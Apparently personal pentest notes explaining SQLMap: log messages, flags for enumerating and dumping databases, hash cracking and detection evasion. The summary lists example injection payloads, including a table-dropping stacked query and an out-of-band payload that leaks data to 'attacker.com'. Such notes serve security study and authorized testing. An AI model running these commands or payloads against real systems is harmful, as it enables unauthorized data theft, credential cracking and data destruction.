```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
[SQLMap](https://github.com/sqlmapproject/sqlmap) is a tool for automating the process of detecting and exploiting SQLi vulnerabilities. It supports a plethora of databases types and the following techniques:
- `B` : Boolean-based blind - `AND 1=1`
- `E` : Error-based - `AND GTID_SUBSET(@@version,0)`
- `U` : Union query-based - `UNION ALL SELECT 1,@@version,3`
- `S` : Stacked queries - `; DROP TABLE users`
- `T` : Time-based blind - `AND 1=IF(2>1,SLEEP(5),0)`
- `Q` : Inline queries - `(SELECT @@version)`
- ` ` : Out-of-band injection - `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))

## Installation
```
sudo apt install sqlmap

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

## Documentation
**Cheatsheet:** 
**Website:** https://github.com/sqlmapproject/sqlmap

## Important log messages
- `Target URL content is stable` : means that the responses are fairly consistent meaning its easier to spot the effects of SQLi attempts
- `GET parameter 'id' appears to be dynamic` : `dynamic` means that changes made to its value, change the output in the response (opposite is `static`)
- `heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')` : means that the get parameter needs to be tested further and it has attempted to guess the DBMS provider based on output.
- `heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks` : SQLMap also quickly runs XSS tests. Its nice to have when running against large websites, *two birds with one stone*.
- `reflective value(s) found and filtering out` : a warning to say that some parts of the payload can be seen in the output so they need to be filtered out before comparing the original page content (*SQLMap does this filtering automatically*).
- `GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")` : This means that SQLMap believes this parameter is a boolean-based blind injection. The `with --string="luther"` is important as it shows that its using this consistent value as its source of TRUE and FALSE responses; this is good as we don't need to use advanced internal mechanisms which could be more susceptible to false-positives.
- `time-based comparison requires a larger statistical model, please wait...(done)` : uses a statistical model for the recognition of regular and (deliberately) delayed target responses. To use this model, SQLMap must collect a large number of responses.
- `automatically extending ranges for UNION query injection technique tests as there is at least on other (potential) technique found` : it takes a large number of requests needed to be able to recognise usable UNION payloads, compared to other techniques. It is capped by default but this cap it extended if there is a good chance of vulnerability.
- `Get parameter 'id' is vulnerable. Do you want to keep testing the others (if any)?` : if we are doing a pentest then we want to test everything, not just find a single vulnerability.

## Usage
```bash
sqlmap -h # Basic options (most common)
sqlmap -hh # Advanced options
```
> A useful trick is to take a HTTP request from a browser, `copy as cURL` and then paste that directly into `sqlmap` as it takes the same format.
> It can also use a request file using `-r [filename]` so we can save requests as files from [[Burp Suite]] and then use them with `sqlmap`.

### Basic Checklist
Basic enumeration:
```bash
sqlmap -u "..." --banner --current-user --current-db --is-dba
```
Table enumeration:
```bash
sqlmap -u "..." --tables -D [db]
```
Dump useful tables:
> We can also specify `-C [cols]` if we know them for larger tables so we don't have loads of data
```bash
sqlmap -u "..." --dump -T [table] -D [db]
```
Full DB enumeration (heavyweight):
```bash
sqlmap -u "..." --dump -D [db]
```
> `--dump-all --exclude-sysbs` can be used to dump all databases in the entire system

### GET Parameters
```bash
sqlmap -u "https://example.com/index.php?id=1" --batch
```
> `--batch` skips all user-input, automatically choosing based on the default options

### POST Parameters
```bash
sqlmap -u "https://example.com/login.php" --data 'username=test&password=*'
```
> The `*` indicates that tests should only use the marked parameter, otherwise they will try all
> We can also specify a particular parameter with `-p username`

### Extracting Data
The `--dump` flag will attempt to exfiltrate content out from the specified data after an SQLi mechanism has been discovered. Some useful basic data enumeration:
- `--hostname` : machine hostname
- `--current-user`
- `--current-db`
- `--passwords` : gets password hashses
- `--banner`
- `--is-dba` : is the current user have DBA rights
- `--tables` : enumerate table names
- `--where` : allows us to add a where clause so we can filter the results returned
- `--schema` : extracts database schema
- `--search` : this can be followed with `-T [table]` or `-C [col]` to search the DB for anything that matches (eg. `--search -C pass` - will return anything with `pass` in the name - not case sensitive)
A good initial enumeration command:
```bash
sqlmap -u "..." --banner --current-user --current-db --is-dba
```

### Password Cracking
SQLMap automatically searches for anything that resembles a hash and automatically attempts to crack them with its internal engine. It supports a plethora of hash algorithms and an internal dictionary of millions of passwords. The `--passwords` flag is a shortcut for grabbing the DB users' password hashses and cracking them.

### Avoiding Detection
The `--random-agent` will change the `user-agent` header to use a regular browser value (*it picks from an internal database at random*). The `--mobile` simulates a mobile browser.

### Display Errors
`--parse-errors` will attempt to parse DBMS errors and display them as part of the logging.

### Store the traffic
If we want to save a copy of the traffic we can use `-t`. This can be useful for debugging as it will show us all requests made.

### Verbose
Verbose has 6 levels depending on how much you wish to log at each level.

### Using a proxy
If we need to redirect traffic through a proxy (eg. [[Burp Suite]]) then we can use `--proxy`

### Specifying custom Prefix / Suffix
```bash
sqlmap -u "..." --prefix="')" --suffix="-- -"
```

### Level / Risk
An `sqlmap` payload contains two things, the **vector** (*the actual SQL code being injected*) eg. `UNION ALL SELECT 1,2,VERSION()` and the **boundaries** (*the injection mechanism*) eg. prefix: `'))` suffix: `-- -`.
`--level` is a value (1-5, default 1) that extends both the vectors and boundaries being tested, the lower the expected chance of success, the higher the required level to test it.
`--risk` is a value (1-3, default 1) that extends the vectors set based on their risk of causing problems (eg. data loss and DoS).

### Success Criteria
Sometimes we need to specify manually the success criteria:
- `--code` can be used to specify which status code is a successful injection
- `--titles` can be used to base the comparison on the webpage `<title>` field
- `--strings` can be used to fixate detection on the occurrence of a string in the response
- `--text-only` strips out all the HTML tags for hidden content and only does matches against the visible (textual) content on the page

### Specifying a technique
`--technique` you can specify the SQLi technique you want to use.
![[#Summary]]


### Union SQLi Tuning
There are some extra parameters that can be specified for Union SQLi:
- `--union-cols` can be used to specify which number of columns to use (*this can be a range*)
- `--union-char` can be used to specify an alternative value (instead of `NULL` or a random integer) to use in the columns
- `--union-from` can be used to specify a FROM table

### Focusing on specific content
`-D` specifies the database to enumerate
`-T` specifies the table to enumerate
`-C` specifies the colum(s) to enumerate